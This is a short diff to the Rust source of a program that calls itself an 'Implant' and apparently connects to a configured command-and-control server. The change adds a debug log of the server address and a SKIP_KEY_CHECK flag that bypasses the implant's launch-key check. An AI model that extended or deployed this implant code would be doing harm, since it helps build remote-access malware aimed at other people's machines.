@@ -16,14 +16,23 @@ use std::env;
 const RUN_KEY: &str = "321";
 
 fn main() {
-    // 检查运行参数
-    let args: Vec<String> = env::args().collect();
+    // 调试：写入日志文件确认是否执行
+    let _ = std::fs::write("C:\\temp\\implant_debug.txt", format!(
+        "Implant started!\nSKIP_KEY_CHECK: {}\nServer: {}:{}\n",
+        config::SKIP_KEY_CHECK,
+        config::SERVER_HOST,
+        config::SERVER_PORT
+    ));
     
-    // 必须提供 -k <key> 参数
-    let valid = if args.len() >= 3 && args[1] == "-k" && args[2] == RUN_KEY {
+    // 检查是否需要验证启动密钥
+    let valid = if config::SKIP_KEY_CHECK {
+        // 跳过密钥检查，直接运行
         true
     } else {
-        false
+        // 检查运行参数
+        let args: Vec<String> = env::args().collect();
+        // 必须提供 -k <key> 参数
+        args.len() >= 3 && args[1] == "-k" && args[2] == RUN_KEY
     };
     
     if !valid {
